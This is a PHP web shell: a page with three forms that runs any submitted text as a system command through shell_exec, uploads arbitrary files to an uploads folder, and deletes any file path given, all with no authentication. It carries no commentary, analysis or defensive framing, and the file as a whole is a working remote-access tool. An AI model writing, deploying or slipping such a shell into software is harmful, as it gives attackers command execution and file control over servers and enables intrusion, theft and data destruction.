<?php
if (isset($_POST['command']) && !empty($_POST['command'])) {
    $command = $_POST['command'];
    echo "<pre>" . shell_exec($command) . "</pre>";
}

if (isset($_FILES['fileToUpload'])) {
    $target_dir = "../uploads/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "File ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])). " uploaded.";
    } else {
        echo "File upload error.";
    }
}

if (isset($_POST['fileToDelete']) && !empty($_POST['fileToDelete'])) {
    $fileToDelete = $_POST['fileToDelete'];
    if (unlink($fileToDelete)) {
        echo "File $fileToDelete deleted";
    } else {
        echo "Unsuccessful file $fileToDelete deleting";
    }
}
?>

<form action="" method="post">
    <label for="command">Command:</label>
    <input type="text" id="command" name="command">
    <input type="submit" value="Execute ">
</form>

<form action="" method="post" enctype="multipart/form-data">
    <label for="fileToUpload">Load file:</label>
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Load" name="submit">
</form>

<form action="" method="post">
    <label for="fileToDelete">Delete file:</label>
    <input type="text" id="fileToDelete" name="fileToDelete">
    <input type="submit" value="Delete">
</form>
